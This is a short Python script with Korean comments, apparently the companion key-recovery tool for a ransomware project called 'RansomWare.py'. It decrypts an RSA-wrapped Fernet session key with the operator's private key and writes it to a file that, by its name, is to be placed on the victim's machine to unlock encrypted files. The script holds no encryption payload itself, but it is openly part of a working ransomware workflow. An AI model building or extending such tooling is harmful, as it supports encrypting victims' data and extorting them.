from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP

#RansomWare.py에서 생성한 키 읽기
with open('fernet_key.txt','rb') as f:
    enc_fernet_key=f.read()
    print(enc_fernet_key)

#RSA_private_public_keys 에서 생성한 비밀키 읽기
private_key=RSA.import_key(open('private.pem').read())
private_crypter=PKCS1_OAEP.new(private_key) #해독

#해독된 세션 키 
dec_fernet_key=private_crypter.decrypt(enc_fernet_key)
with open('PUT_ME_ON_RansomWare.txt','wb') as f:
    f.write(dec_fernet_key)

print(f'> Private key: {private_key}') #비밀키
print(f'> Private decrypter: {private_crypter}') #
print(f'> Decrypted fernet key: {dec_fernet_key}')
print('> Decryption Completed!') #완료 